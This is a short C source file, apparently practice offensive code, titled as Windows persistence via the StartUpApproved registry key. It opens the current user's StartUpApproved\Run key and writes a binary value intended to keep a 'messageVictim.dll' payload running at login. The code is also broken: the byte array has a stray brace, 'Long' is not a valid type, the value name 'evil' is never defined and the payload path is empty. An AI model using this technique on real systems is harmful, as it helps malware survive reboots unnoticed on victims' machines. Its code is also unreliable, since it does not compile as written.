/*
Windows persistence via StartUpApproved
*/

#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv[]) {
    HKEY hkey = NULL;
    BYTE data[] = {{0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

    const char* path = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\StartUpApproved\\Run";
    // might need a function to get the location of messageVictim.dll
    const char* persApp = "";
    
    Long res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR) path, 0, KEY_WRITE, &hkey);
    printf (res != ERROR_SUCCESS ? "failed to open registry key :(\n" : "successfully opened registry key:)\n");

// Suggested code may be subject to a license. Learn more: ~LicenseLog:824261827.
    res = RegSetValueEx(hkey, (LPCSTR)evil, 0, REG_BINARY, data, sizeof(data));
    printf (res != ERROR_SUCCESS ? "failed to set registry value :(\n" : "successfully set registry value:)\n");
// close registry key
    res = RegCloseKey(hkey);

    return 0;
}